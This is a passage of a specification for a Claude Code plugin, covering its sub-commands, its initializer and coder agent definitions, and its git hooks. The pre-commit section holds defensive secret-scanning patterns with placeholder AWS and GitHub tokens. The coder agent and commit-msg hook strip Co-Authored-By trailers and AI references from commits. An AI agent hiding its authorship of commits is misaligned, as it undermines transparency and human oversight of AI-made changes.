  **Then** it asks 4 follow-up questions: (1) what can a user do, (2) what happens when it goes wrong, (3) what are the edge cases, (4) what does success look like

- **Given** all features have been described and categorized
  **When** the skill writes the spec
  **Then** `.specify/specs/spec.md` contains: an Overview section with project
  name/version/summary, features grouped by category with sequential IDs
  (INFRA-xxx, FUNC-xxx, STYLE-xxx, TEST-xxx), acceptance criteria using checkboxes
  for infrastructure/testing features and Given/When/Then for functional features,
  error handling tables for functional features, dependency declarations for each feature

- **Given** `.specify/specs/spec.md` already exists
  **When** the user runs `/specforge spec`
  **Then** the skill reads the existing spec and asks whether to add new features, revise existing features, or start fresh

- **Given** the file `skills/specforge/SKILL.md` under `.claude-plugin/` is inspected
  **When** its content is checked
  **Then** it contains an H3 section `### /specforge spec`

- **Given** the `### /specforge spec` section in SKILL.md is read
  **When** its prerequisite instructions are checked
  **Then** the section references `constitution.md` as a prerequisite read

- **Given** the `### /specforge spec` section in SKILL.md is read
  **When** its output path is checked
  **Then** the section references `.specify/specs/spec.md` as the output artifact

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Constitution not found | Prompt user to run constitution first | "No constitution found. Run `/specforge constitution` first." |
| `.specify/specs/` directory missing | Create the directory | None (silent mkdir -p) |
| Spec template not found | Use known template structure from SKILL.md | "Spec template not found. Using default structure." |

**Edge Cases:**

- Feature IDs use category prefix + 3-digit sequential number: INFRA-001, FUNC-001, STYLE-001, TEST-001
- Infrastructure features always declare "Dependencies: None"
- The skill suggests a category for each feature but the user can override the suggestion
- Features can declare dependencies on other features by their ID

**Dependencies:** INFRA-001, FUNC-007

---

### FUNC-009: /specforge clarify Sub-Command

**Description:** Interactive sub-command that surfaces ambiguities, contradictions, missing error handling, undefined edge cases, and unstated assumptions in the spec. Presents each issue as a numbered question with quoted spec text, impact explanation, and 2-3 suggested resolutions. Updates the spec with resolved decisions.

**Acceptance Criteria:**

- **Given** the user runs `/specforge clarify` and both constitution and spec exist
  **When** the skill analyzes the spec
  **Then** it identifies and presents issues grouped by type: ambiguous requirements, missing error handling, undefined edge cases, contradictions with constitution, missing non-functional requirements, unstated assumptions

- **Given** the skill presents an issue with 3 suggested resolutions
  **When** the user selects one (e.g., "option 2")
  **Then** the skill records the decision and updates `.specify/specs/spec.md` with the resolution text

- **Given** all identified issues have been resolved
  **When** the skill finishes
  **Then** it reports the count of resolved issues and confirms no `[TBD]` or `[TODO]` markers remain in the spec

- **Given** no issues are found
  **When** the skill analyzes the spec
  **Then** it reports "No ambiguities detected. Spec appears ready for planning."

- **Given** the file `skills/specforge/SKILL.md` under `.claude-plugin/` is inspected
  **When** its content is checked
  **Then** it contains an H3 section `### /specforge clarify`

- **Given** the `### /specforge clarify` section in SKILL.md is read
  **When** its prerequisite instructions are checked
  **Then** the section references both `constitution.md` and `spec.md` as prerequisite reads

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Constitution not found | Prompt | "No constitution found. Run `/specforge constitution` first." |
| Spec not found | Prompt | "No spec found. Run `/specforge spec` first." |

**Edge Cases:**

- Can be run multiple times; each invocation re-analyzes the current spec state
- Each issue is presented with: the quoted spec text, why it matters for autonomous implementation, and 2-3 concrete resolution options
- Resolutions are applied inline to the spec (not stored in a separate decisions file)
- The skill iterates until the user confirms all issues are resolved or explicitly says to stop

**Dependencies:** FUNC-008

---

### FUNC-010: /specforge plan Sub-Command

**Description:** Interactive sub-command that makes and records technical architecture decisions. Reads constitution and spec, proposes decisions for each area with recommendation/rationale/alternatives, gets explicit human approval for each, and writes `.specify/specs/plan.md`.

**Acceptance Criteria:**

- **Given** the user runs `/specforge plan` and constitution + spec exist
  **When** the skill activates
  **Then** it presents the first technical decision area with: recommendation, rationale, 1-2 alternatives with trade-offs

- **Given** the skill proposes a decision (e.g., "Use PostgreSQL for data storage")
  **When** the user says "approve" or "yes"
  **Then** the decision is recorded with "Status: Approved" and the rationale

- **Given** the user rejects a proposal and provides their own choice
  **When** the skill records the decision
  **Then** the user's choice is recorded as the decision, and the original recommendation is listed under "Alternatives considered"

- **Given** all applicable decision areas are resolved
  **When** the skill writes the plan
  **Then** `.specify/specs/plan.md` contains: each decision area as a section with the final decision, rationale, alternatives considered, and trade-offs noted

- **Given** `.specify/specs/plan.md` already exists
  **When** the user runs `/specforge plan`
  **Then** the skill reads the existing plan, displays it, and asks which decisions to revisit

- **Given** the file `skills/specforge/SKILL.md` under `.claude-plugin/` is inspected
  **When** its content is checked
  **Then** it contains an H3 section `### /specforge plan`

- **Given** the `### /specforge plan` section in SKILL.md is read
  **When** its prerequisite instructions are checked
  **Then** the section references `constitution.md` and `spec.md` as prerequisite reads

- **Given** the `### /specforge plan` section in SKILL.md is read
  **When** its output path is checked
  **Then** the section references `.specify/specs/plan.md` as the output artifact

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Constitution not found | Prompt | "Run `/specforge constitution` first." |
| Spec not found | Prompt | "Run `/specforge spec` first." |
| Plan template not found | Use known structure | "Plan template not found. Using default structure." |

**Edge Cases:**

- Standard decision areas: project structure (directory layout), tech stack (languages, frameworks), data storage, API design, deployment architecture, testing strategy, CI/CD platform
- Not all areas apply to every project; the skill skips irrelevant ones (e.g., no API design for a purely CLI tool, no data storage for a static site)
- Each decision requires explicit user approval; the skill never auto-approves

**Dependencies:** FUNC-008

---

### FUNC-011: /specforge features Sub-Command

**Description:** Sub-command that generates `feature_list.json` from the spec and plan.
Creates entries with id (kebab-case), category, title, description, testing_steps
(3-15 concrete steps), passes (always false), dependencies. Validates against the
JSON schema, checks for cycles and reference integrity, and ensures at least 20% of
features have 10+ testing steps.

**Acceptance Criteria:**

- **Given** the user runs `/specforge features` and constitution, spec, and plan all exist
  **When** the skill generates the feature list
  **Then** `feature_list.json` is created at the project root with a `features` array containing one entry per spec feature

- **Given** the generated `feature_list.json`
  **When** validated with `jq -e '.features[] | has("id","category","title","description","testing_steps","passes","dependencies")' feature_list.json > /dev/null`
  **Then** the command exits 0

- **Given** the generated feature list
  **When** each feature's `id` field is checked
  **Then** every ID matches the regex `^[a-z][a-z0-9]*(-[a-z0-9]+)*$`

- **Given** the generated feature list
  **When** dependency references are checked
  **Then** every string in every `dependencies` array matches an `id` field of another feature in the list

- **Given** the generated feature list
  **When** topological sort is attempted on the dependency graph
  **Then** no cycle is detected (sort completes without error)

- **Given** the generated feature list
  **When** `testing_steps` arrays are counted
  **Then** every feature has >= 3 entries, and at least 20% of total features have >= 10 entries

- **Given** the generated feature list
  **When** feature ordering is checked
  **Then** all `infrastructure` category features appear before `functional`, which appear before `style`, which appear before `testing`

- **Given** the generated feature list
  **When** every `passes` field is checked
  **Then** all values are `false`

- **Given** the file `skills/specforge/SKILL.md` under `.claude-plugin/` is inspected
  **When** its content is checked
  **Then** it contains an H3 section `### /specforge features`

- **Given** the `### /specforge features` section in SKILL.md is read
  **When** its prerequisite instructions are checked
  **Then** the section references `constitution.md`, `spec.md`, and `plan.md` as prerequisite reads

- **Given** the `### /specforge features` section in SKILL.md is read
  **When** its output path is checked
  **Then** the section references `feature_list.json` as the output artifact

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Spec or plan missing | Prompt user | "Missing prerequisites. Run `/specforge spec` and `/specforge plan` first." |
| Schema file not found | Use built-in validation | "Schema file not found at expected path. Using built-in validation rules." |
| Circular dependency detected | Remove the offending edge and explain | "Circular dependency detected between [A] and [B]. Removing [B] from [A]'s dependencies." |
| Testing step count below threshold | Add more steps interactively | "Feature [X] has only N testing steps (minimum 3). Please provide additional steps." |

**Edge Cases:**

- Feature IDs are derived from spec IDs: `INFRA-001` becomes something like `plugin-directory-structure` (kebab-case of the title)
- Array order is the tiebreaker. Dependencies are the primary constraint. When multiple features are eligible (deps met, passes=false), the coder agent selects the first one in array order.
- Testing steps must be concrete: specific file paths, commands, exit codes, or string matches. Vague phrases like "works correctly", "looks good", or "functions properly" are rejected.
- The skill presents the generated JSON for human review before writing to disk
- If `feature_list.json` already exists, the skill asks whether to regenerate or update

**Dependencies:** FUNC-010

---

### FUNC-012: /specforge analyze Sub-Command

**Description:** Scores spec artifacts for autonomous-readiness on a 0-100 scale across 5 weighted dimensions. Outputs per-dimension breakdown, overall weighted score, remediation steps for dimensions below 70, and a recommendation of "READY" (>= 80) or "NEEDS WORK" (< 80).

**Acceptance Criteria:**

- **Given** all artifacts exist (constitution, spec, plan, feature_list.json)
  **When** the user runs `/specforge analyze`
  **Then** it outputs scores for: Completeness (25% weight), Testability (25% weight), Dependency Quality (15% weight), Ambiguity (20% weight), Autonomous Feasibility (15% weight)

- **Given** the overall weighted score is >= 80
  **When** the analysis completes
  **Then** it outputs "Recommendation: READY for autonomous implementation"

- **Given** the overall weighted score is < 80
  **When** the analysis completes
  **Then** it outputs "Recommendation: NEEDS WORK" followed by a numbered list of specific remediation steps

- **Given** the Testability dimension scores below 70
  **When** the analysis completes
  **Then** it lists specific features with vague testing steps (matching phrases: "works correctly", "looks good", "functions properly", "is valid", "handles errors", "performs well") and suggests concrete replacement text

- **Given** `feature_list.json` does not exist
  **When** the user runs `/specforge analyze`
  **Then** Completeness dimension is capped at 50, and remediation includes "Run `/specforge features` to generate feature_list.json"

- **Given** the dependency graph has a chain longer than 5 features
  **When** the Dependency Quality dimension is scored
  **Then** the score is penalized and remediation suggests breaking the chain by introducing parallel tracks

- **Given** the dependency graph has fewer than 3 independent root features (features with no dependencies)
  **When** the Dependency Quality dimension is scored
  **Then** the score is penalized and remediation suggests adding more independent starting points

- **Given** the file `skills/specforge/SKILL.md` under `.claude-plugin/` is inspected
  **When** its content is checked
  **Then** it contains an H3 section `### /specforge analyze`

- **Given** the `### /specforge analyze` section in SKILL.md is read
  **When** its scoring dimensions are checked
  **Then** the section lists five dimensions: Completeness, Testability, Dependency Quality, Ambiguity, Autonomous Feasibility

- **Given** the `### /specforge analyze` section in SKILL.md is read
  **When** its prerequisite instructions are checked
  **Then** the section references `feature_list.json` as an input artifact

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| No artifacts exist | All dimensions score 0, overall 0 | "No spec artifacts found. Start with `/specforge constitution`." |
| Only constitution exists | Score available, cap others at 50 | "Missing spec, plan, and feature_list. Completeness capped." |
| feature_list.json fails schema validation | Feature-list sub-score is 0 | "feature_list.json does not validate against schema. Completeness sub-score: 0." |

**Edge Cases:**

- Autonomous Feasibility checks for: references to manual/visual testing, external API keys without mock instructions, GUI-only verification steps, references to "open in browser and check"
- Dependency Quality checks: max chain depth, graph width (number of independent roots), cycle detection
- Each dimension's raw score is 0-100; the final score is the weighted sum: `0.25*C + 0.25*T + 0.15*D + 0.20*A + 0.15*F`
- The output format is a scorecard table with dimension, raw score, weight, and weighted contribution

**Dependencies:** FUNC-011

---

### FUNC-013: /specforge setup Sub-Command

**Description:** Generates a platform-specific project setup checklist. Reads the plan for CI platform (defaults to GitHub). Outputs numbered steps with `gh` CLI commands where possible for automated execution.

**Acceptance Criteria:**

- **Given** the plan specifies GitHub as the CI platform (or no plan exists, defaulting to GitHub)
  **When** the user runs `/specforge setup`
  **Then** it outputs a numbered checklist covering: branch protection on main, required status checks (summary job only), CODEOWNERS for critical paths, Dependabot configuration, CodeQL + secret scanning with push protection, squash merge default with auto-delete head branches, PR and issue templates

- **Given** the branch protection step is presented
  **When** the user reads the checklist
  **Then** it includes the specific `gh api` command to enable branch protection on `main` with required reviews and status checks

- **Given** the CODEOWNERS step is presented
  **When** the user reads the checklist
  **Then** it lists critical paths: `.claude/`, `.github/`, `scripts/hooks/`, `ci/`, `.specify/memory/`, `.claude-plugin/`

- **Given** the checklist includes Dependabot
  **When** the user reads the step
  **Then** it lists the detected ecosystems (from config files in the project) for Dependabot to monitor

- **Given** no plan exists
  **When** the user runs `/specforge setup`
  **Then** it defaults to GitHub, generates the full checklist, and notes "No plan found. Defaulting to GitHub."

- **Given** the file `skills/specforge/SKILL.md` under `.claude-plugin/` is inspected
  **When** its content is checked
  **Then** it contains an H3 section `### /specforge setup`

- **Given** the `### /specforge setup` section in SKILL.md is read
  **When** its platform references are checked
  **Then** the section references GitHub as the default CI platform

- **Given** the `### /specforge setup` section in SKILL.md is read
  **When** its prerequisite instructions are checked
  **Then** the section references `plan.md` as an optional input (with fallback to GitHub defaults)

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Plan not found | Default to GitHub, warn | "No plan found. Defaulting to GitHub. Run `/specforge plan` for customized setup." |
| Unknown CI platform | Default to GitHub | "Unrecognized CI platform. Defaulting to GitHub." |

**Edge Cases:**

- Required status checks recommendation is always the single `summary` job, not individual check jobs (conditional jobs show as "skipped" and block PRs if required directly)
- Steps are ordered: repo settings, protection rules, templates, Dependabot, security scanning
- The checklist auto-detects project ecosystems by looking for package.json, go.mod, Cargo.toml, pyproject.toml, etc.

**Dependencies:** FUNC-010

---

### FUNC-014: /specforge init Sub-Command (Scaffold Projection)

**Description:** Sub-command (8 of 9) that projects the scaffold layer from the plugin into a host
project. Copies CI workflows, git hooks, templates, CLAUDE.md template, prettierrc,
quality principles, CODEOWNERS, dependabot, PR template, and issue templates into the
target directory. Creates `.specforge-version` to track the installed version. Full
opinionated projection: everything gets copied, no interactive selection.

**Acceptance Criteria:**

- **Given** the user runs `/specforge init` in a git repository
  **When** the command executes
  **Then** all scaffold files are present in the host project:
  `.specify/templates/` (all 5 template files), `.specify/WORKFLOW.md`,
  `scripts/hooks/pre-commit`, `scripts/hooks/commit-msg`,
  `scripts/install-hooks.sh`, `ci/principles/` (commit-gate.md, pr-gate.md,
  release-gate.md), `ci/github/` (workflows, CODEOWNERS template, dependabot,
  PR template), `prompts/initializer-prompt.md`, `prompts/coding-prompt.md`,
  `.prettierrc.json`, `.prettierignore`, `.github/` (workflows/ci.yml,
  CODEOWNERS, dependabot.yml, PR template, issue templates)

- **Given** the target directory is not a git repository
  **When** the command executes
  **Then** it runs `git init -b main` before copying files

- **Given** a scaffold file already exists in the host project (e.g., `CLAUDE.md` already present)
  **When** the command copies files
  **Then** it skips the existing file, prints "Exists, skipping: <relative-path>", and continues

- **Given** the command completes successfully
  **When** `.specforge-version` is read
  **Then** it contains the exact semver version string from the plugin's `plugin.json`

- **Given** the command completes
  **When** `scripts/install-hooks.sh` is checked
  **Then** it has been executed, installing pre-commit and commit-msg to `.git/hooks/`

- **Given** the command completes
  **When** all `.sh` files in copied directories are checked
  **Then** they are executable (have the execute permission bit set)

- **Given** `CLAUDE.md` does not exist but `CLAUDE.md.template` is in the plugin scaffold
  **When** the command copies files
  **Then** `CLAUDE.md.template` is copied AND `CLAUDE.md` is created from the template

- **Given** the command completes
  **When** a summary is printed
  **Then** it shows files copied count, files skipped count, and numbered next steps

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Target directory does not exist | Exit with error | "Target directory does not exist: <path>" |
| No write permissions | Exit with error | "Cannot write to target directory: <path>" |
| plugin.json not found | Exit with error | "Plugin manifest not found. Plugin installation may be corrupted." |
| `git` not on PATH | Warn and continue (skip git init and hook install) | "git not found. Skipping repository initialization and hook installation." |

**Edge Cases:**

- `.specforge-version` is always written (overwrite, not skip) even if it already exists, since it tracks the plugin version
- File copy preserves the directory structure exactly
- CLAUDE.md.template is copied as `CLAUDE.md` only when `CLAUDE.md` does not already exist; if both exist, neither is touched
- The init command is idempotent: running it twice copies 0 files on the second run (everything is skipped)

**Dependencies:** INFRA-001, INFRA-005

---

### FUNC-015: /specforge upgrade Sub-Command

**Description:** Sub-command (9 of 9) that updates scaffold files in a host project. Uses three-tier
file categorization: (1) overwrite -- foundation-owned files always replaced, (2) review
-- commonly customized files shown as diffs for user decision, (3) skip -- project-specific
files never touched. Reads `.specforge-version` to determine what changed between versions.

**Acceptance Criteria:**

- **Given** the user runs `/specforge upgrade` and `.specforge-version` exists with version `1.0.0` while plugin is at `1.1.0`
  **When** the command reads version info
  **Then** it prints "Upgrading from 1.0.0 to 1.1.0"

- **Given** files in the "overwrite" tier: `ci/principles/*.md`, `scripts/hooks/pre-commit`, `scripts/hooks/commit-msg`, `.specify/templates/*.md`, `.specify/templates/feature-list-schema.json`, `.specify/WORKFLOW.md`
  **When** the upgrade runs
  **Then** these files are replaced with the plugin's current versions without prompting

- **Given** files in the "review" tier: `.github/workflows/ci.yml`, `.github/CODEOWNERS`, `.prettierrc.json`, `.prettierignore`
  **When** the upgrade runs and a review-tier file differs from the plugin version
  **Then** a `diff -u` output is shown and the user is asked "Accept this change? [y/n]"

- **Given** files in the "skip" tier: `CLAUDE.md`, `.specify/memory/constitution.md`, `.specify/specs/spec.md`, `.specify/specs/plan.md`, `feature_list.json`, `claude-progress.txt`
  **When** the upgrade runs
  **Then** these files are never modified

- **Given** the upgrade completes
  **When** `.specforge-version` is checked
  **Then** it contains the new version number (`1.1.0`)

- **Given** `.specforge-version` does not exist
  **When** the user runs `/specforge upgrade`
  **Then** it prints "No version file found. Running as fresh install." and delegates to init behavior

- **Given** the current version equals the plugin version
  **When** the user runs `/specforge upgrade`
  **Then** it prints "Already at version X.Y.Z. Nothing to upgrade." and exits

- **Given** the plugin has a new file that did not exist in the previous version
  **When** the upgrade encounters the new file
  **Then** it copies the file to the host project (treated as overwrite tier for new files)

- **Given** the file `.claude-plugin/upgrade-tiers.json` exists
  **When** its contents are inspected
  **Then** it lists every scaffolded file with its tier assignment (overwrite, review, or skip), and the file list is consistent with the files projected by `/specforge init` (FUNC-014)

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| `.specforge-version` missing | Fall back to init | "No version file found. Running as fresh install." |
| Current version == new version | Skip | "Already at version X.Y.Z. Nothing to upgrade." |
| Review-tier file has local modifications | Show diff, ask user | "Local modifications detected in <file>. Review changes? [y/n]" |
| Diff tool not available | Show raw file content comparison | "diff not available. Showing file contents for manual comparison." |

**Edge Cases:**

- The tier classification is defined in `.claude-plugin/upgrade-tiers.json` inside the plugin, not hardcoded in the upgrade script
- Files removed in a newer plugin version are NOT deleted from the host project; they are logged as "Deprecated: <file> (no longer in plugin, can be manually removed)"
- The diff display uses `diff -u` (unified format) for readability
- Running upgrade is safe to abort mid-way; already-overwritten files will be at the new version, unapplied files remain at the old version

**Dependencies:** INFRA-001, FUNC-014

---

### FUNC-016: Initializer Agent Definition

**Description:** Agent definition file at `.claude-plugin/agents/initializer.md` for the first session of the two-agent autonomous execution pattern. Reads spec artifacts, validates feature_list.json, creates init.sh, initializes git, creates project structure per the plan. Does NOT implement features.

**Acceptance Criteria:**

- **Given** the agent file exists at `.claude-plugin/agents/initializer.md`
  **When** a user activates the agent
  **Then** it reads `.specify/memory/constitution.md`, `.specify/specs/spec.md`, `.specify/specs/plan.md`, and `feature_list.json` in that order

- **Given** `feature_list.json` exists
  **When** the agent validates it
  **Then** it checks: JSON schema compliance, all dependency IDs resolve to existing feature IDs, dependency graph has no cycles

- **Given** `feature_list.json` does not exist
  **When** the agent runs
  **Then** it creates `feature_list.json` from the spec with all `passes` fields set to `false`

- **Given** the agent completes successfully
  **When** the project is inspected
  **Then** `init.sh` exists, is executable (`test -x init.sh` exits 0), `.gitignore` exists and is appropriate for the detected tech stack, directory structure matches what the plan specifies, `claude-progress.txt` exists with a session summary

- **Given** the agent runs
  **When** its git log is checked
  **Then** there is a commit with message matching `chore: initialize project structure`

- **Given** the agent completes
  **When** application source files are checked
  **Then** no feature implementation code exists (only scaffolding, config, and structure)

- **Given** the file `agents/initializer.md` under `.claude-plugin/` is inspected
  **When** its existence is checked
  **Then** the file exists at `.claude-plugin/agents/initializer.md`

- **Given** the content of `.claude-plugin/agents/initializer.md` is read
  **When** its artifact references are checked
  **Then** the file contains references to `constitution.md`, `spec.md`, `plan.md`, and `feature_list.json`

- **Given** the content of `.claude-plugin/agents/initializer.md` is read
  **When** its prerequisite instructions are checked
  **Then** the file contains a prerequisite check instructing the agent to verify spec artifacts exist before proceeding

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| constitution.md missing | Abort | "Cannot proceed: constitution.md not found. Run `/specforge constitution` first." |
| spec.md missing | Abort | "Cannot proceed: spec.md not found. Run `/specforge spec` first." |
| plan.md missing | Abort | "Cannot proceed: plan.md not found. Run `/specforge plan` first." |
| feature_list.json fails validation | Report errors, attempt auto-repair | "Validation errors found in feature_list.json: [list]. Attempting repair." |

**Edge Cases:**

- The agent content is based on `prompts/initializer-prompt.md` adapted to the Claude Code agent markdown format
- `init.sh` must be idempotent (running it twice produces no side effects)
- `init.sh` must work on both macOS and Linux
- The only mutable field in `feature_list.json` is `passes`; the agent does not change any other field

**Dependencies:** INFRA-001, FUNC-011

---

### FUNC-017: Coder Agent Definition

**Description:** Agent definition file at `.claude-plugin/agents/coder.md` for subsequent sessions of the two-agent pattern. Implements the 10-step loop: orient, start servers, verify existing, select feature, implement, test, update tracking, commit, document, clean shutdown.

**Acceptance Criteria:**

- **Given** the agent file exists at `.claude-plugin/agents/coder.md`
  **When** a user activates the agent
  **Then** it reads constitution.md, plan.md, claude-progress.txt, runs `git log --oneline -20`, and reads feature_list.json (Step 1: Orient)

- **Given** `feature_list.json` has features with `passes: true`
  **When** the agent starts (Step 3: Verify Existing)
  **Then** it re-tests 1-2 previously passing features by executing their `testing_steps`

- **Given** a previously passing feature now fails its testing steps
  **When** the agent detects the regression
  **Then** it fixes the regression before selecting any new feature (regressions have absolute priority)

- **Given** the agent selects a feature (Step 4)
  **When** choosing from eligible features
  **Then** it selects the first feature in the array where `passes` is `false` AND every ID in `dependencies` has `passes: true` in the current `feature_list.json`

- **Given** all testing_steps pass for an implemented feature
  **When** the agent updates tracking (Step 7)
  **Then** it sets `passes: true` for that feature in `feature_list.json` and does NOT modify any other field

- **Given** some testing_steps fail
  **When** the agent finishes testing
  **Then** `passes` remains `false` and `claude-progress.txt` documents which steps failed and why

- **Given** the agent commits (Step 8)
  **When** the commit is inspected
  **Then** it uses `git add <specific-files>` (not `git add .`), the message follows conventional commit format, contains no emoji, no AI-isms, no Co-Authored-By trailer

- **Given** the agent session ends (Step 10)
  **When** the project state is checked
  **Then** all changes are committed (git status is clean), `claude-progress.txt` has been updated with: features completed this session, total pass rate (X of Y), issues encountered, recommendations for next session

- **Given** the file `agents/coder.md` under `.claude-plugin/` is inspected
  **When** its existence is checked
  **Then** the file exists at `.claude-plugin/agents/coder.md`

- **Given** the content of `.claude-plugin/agents/coder.md` is read
  **When** its loop structure is checked
  **Then** the file contains the 10-step loop with numbered steps

- **Given** the content of `.claude-plugin/agents/coder.md` is read
  **When** its feature selection references are checked
  **Then** the file references `feature_list.json` for feature selection and tracking

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| feature_list.json missing | Abort | "feature_list.json not found. Run the initializer agent first." |
| No eligible features | Report and stop | "No eligible features: all pass or all have unmet dependencies." |
| init.sh fails | Diagnose and attempt fix | "init.sh failed with exit code N. Diagnosing..." |
| External blocker (API key, service) | Document and skip | "Blocked on [feature]: [reason]. Moving to next eligible feature." |

**Edge Cases:**

- The agent implements exactly one feature per loop iteration; it may complete multiple features in one session
- Only the `passes` field in `feature_list.json` is mutable; all other fields are treated as read-only
- Each completed feature gets its own commit (one commit per feature, not one commit per session)
- The agent uses `git add <specific-files>` to avoid committing unintended files

**Dependencies:** INFRA-001, FUNC-016

---

### FUNC-018: Pre-commit Git Hook

**Description:** Git hook installed to `.git/hooks/pre-commit` via `install-hooks.sh`. Discovers staged files, checks for forbidden files, scans staged content for secret patterns, and runs language-appropriate linters. Source lives in `scripts/hooks/pre-commit`.

**Acceptance Criteria:**

- **Given** a commit is attempted with `.env` staged
  **When** the pre-commit hook runs
  **Then** it exits 1 and stderr contains "BLOCKED: Forbidden file: .env"

- **Given** a commit is attempted with a file containing `AKIA1234567890123456` (AWS key pattern) staged
  **When** the pre-commit hook runs
  **Then** it exits 1 and stderr contains "SECRET: AWS key pattern in <filename>"

- **Given** a commit is attempted with a file containing `ghp_abcdefghijklmnopqrstuvwxyz1234567890` (GitHub token pattern)
  **When** the pre-commit hook runs
  **Then** it exits 1 and stderr contains "SECRET: GitHub token pattern in <filename>"

- **Given** a commit is attempted with a staged `.sh` file that has shellcheck errors
  **When** the hook runs and shellcheck is installed
  **Then** it exits 1 and stderr contains "LINT FAIL: <filename>"

- **Given** a commit is attempted with a staged `.go` file that is not gofmt-formatted
  **When** the hook runs and gofmt is installed
  **Then** it runs `gofmt -w <file>`, re-stages the file with `git add <file>`, and allows the commit to proceed

- **Given** a commit with no staged files
  **When** the pre-commit hook runs
  **Then** it exits 0 immediately

- **Given** a staged generated file like `service_pb2.py`
  **When** the pre-commit hook runs
  **Then** it skips linting for that file

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| No staged files | Exit 0 immediately | None |
| shellcheck/ruff/eslint not installed | Skip that linter for the file | None |
| `git show :<file>` fails | Skip secret scan for that file | None |
| Protobuf-generated file detected | Skip lint | None |

**Edge Cases:**

- Only Added, Copied, and Modified files are checked (`--diff-filter=ACM`); deleted files are skipped
- Secret patterns are checked on the staged content (`git show :file`), not the working tree copy
- The `find_project_root()` function walks up from the file's directory to find the nearest `package.json`, `Cargo.toml`, `pyproject.toml`, or `go.mod`
- Go files get special treatment: auto-format with `gofmt -w` then `git add` to re-stage the formatted version
- Go linting prefers `golangci-lint` over `go vet` when available

**Dependencies:** INFRA-001

---

### FUNC-019: Commit-msg Git Hook

**Description:** Git hook installed to `.git/hooks/commit-msg` via `install-hooks.sh`. Validates commit message format: conventional commits, blocks AI-isms, emoji, marketing adjectives, AI branding, standalone "Claude". Warns on subject length > 72, body lines > 100, and draft markers. Source lives in `scripts/hooks/commit-msg`.

**Acceptance Criteria:**

- **Given** a commit with message `added new feature`
  **When** the hook runs
  **Then** it exits 1 with stderr containing "ERROR: Subject does not match conventional commit format"

- **Given** a commit with message `feat: add user login`
  **When** the hook runs
  **Then** it exits 0

- **Given** a commit with message `fix(auth): resolve token expiry issue`
  **When** the hook runs
  **Then** it exits 0 (scoped conventional commit is valid)

- **Given** a commit with message containing "I have updated the tests"
  **When** the hook runs
  **Then** it exits 1 with stderr containing "ERROR: Self-referential language detected"

- **Given** a commit with message containing an emoji character (e.g., a rocket emoji in the subject)
  **When** the hook runs
  **Then** it exits 1 with stderr containing "ERROR: Emoji detected in commit message"

- **Given** a commit with message `feat: seamless integration with backend`
  **When** the hook runs
  **Then** it exits 1 with stderr containing "ERROR: Marketing adjective detected"

- **Given** a commit with subject exactly 72 characters in conventional format
  **When** the hook runs
  **Then** it exits 0 with no warnings about length

- **Given** a commit with subject of 73 characters in conventional format
  **When** the hook runs
  **Then** it exits 0 but stderr contains "WARN: Subject line exceeds 72 characters"

- **Given** a commit with message containing `Co-Authored-By: Bot <bot@example.com>`
  **When** the hook runs
  **Then** it exits 1 and stderr contains "ERROR: Co-Authored-By trailer detected"

- **Given** a commit with message `fix: update Claude Code integration`
  **When** the hook runs
  **Then** it exits 0 (the phrase "Claude Code" is an allowed product reference)

- **Given** a commit with message `fix: update Claude integration`
  **When** the hook runs
  **Then** it exits 1 with stderr containing "ERROR: Standalone 'Claude' detected"

- **Given** an empty commit message
  **When** the hook runs
  **Then** it exits 1 with stderr containing "ERROR: Empty commit message"

- **Given** a commit with body containing `WIP: still working on this`
  **When** the hook runs
  **Then** it exits 0 but stderr contains "WARN: Draft marker detected"

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Empty commit message | Exit 1 | "ERROR: Empty commit message." |
| Emoji detection regex unsupported by grep version | Skip emoji detection | None |
| Message file not readable | Exit with shell error | Standard shell error |

**Edge Cases:**

- Hook receives message file path as `$1`; reads subject from `head -n 1` and full message from `cat`
- "Claude Code" is removed from the message before checking for standalone "Claude"
- Parenthetical scopes like `(auth)` in conventional commit types are also stripped before AI-ism checks
- Body line length check starts at line 3 (skips subject line and the mandatory blank separator)
- Draft markers (WIP, FIXME, TODO, XXX, DO NOT MERGE) produce warnings, not errors
- Co-Authored-By produces an error (exit 1), consistent with the constitution and PR hook

**Dependencies:** INFRA-001

---

### FUNC-020: install-hooks.sh Script

**Description:** Shell script that copies git hooks from `scripts/hooks/` to `.git/hooks/` and makes all Claude Code hooks (`.claude/hooks/*.sh`) executable. Idempotent: safe to run multiple times.

**Acceptance Criteria:**

- **Given** the script runs in a git repository with `scripts/hooks/pre-commit` and `scripts/hooks/commit-msg`
  **When** it executes
  **Then** both hooks are copied to `.git/hooks/`, both are executable, and stdout contains "Installed: pre-commit" and "Installed: commit-msg"

- **Given** the script runs outside a git repository
  **When** it executes
  **Then** it prints "Not in a git repository." to stderr and exits 1

- **Given** `.claude/hooks/` directory exists with `.sh` files
  **When** the script executes
  **Then** all `.sh` files in `.claude/hooks/` have the execute permission bit set

- **Given** a hook source file is missing (e.g., `scripts/hooks/pre-push` does not exist)
  **When** the script tries to install it
  **Then** it prints "Skipped (not found): <path>" and continues without error

- **Given** the script has already been run once
  **When** it runs again
  **Then** it overwrites the existing `.git/hooks/` copies with fresh versions and succeeds

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Not in a git repo | Exit 1 | "Not in a git repository." |
| Source hook file missing | Skip and continue | "Skipped (not found): <path>" |
| `.claude/hooks/` directory missing | Skip chmod step | None |
| `.git/hooks/` directory missing | Create it with `mkdir -p` | None |

**Edge Cases:**

- Uses `git rev-parse --show-toplevel` to find the project root
- The `.git/hooks/` directory is created with `mkdir -p` if absent
- Running multiple times is safe; each run copies fresh hook files

**Dependencies:** None

---

## Testing Features

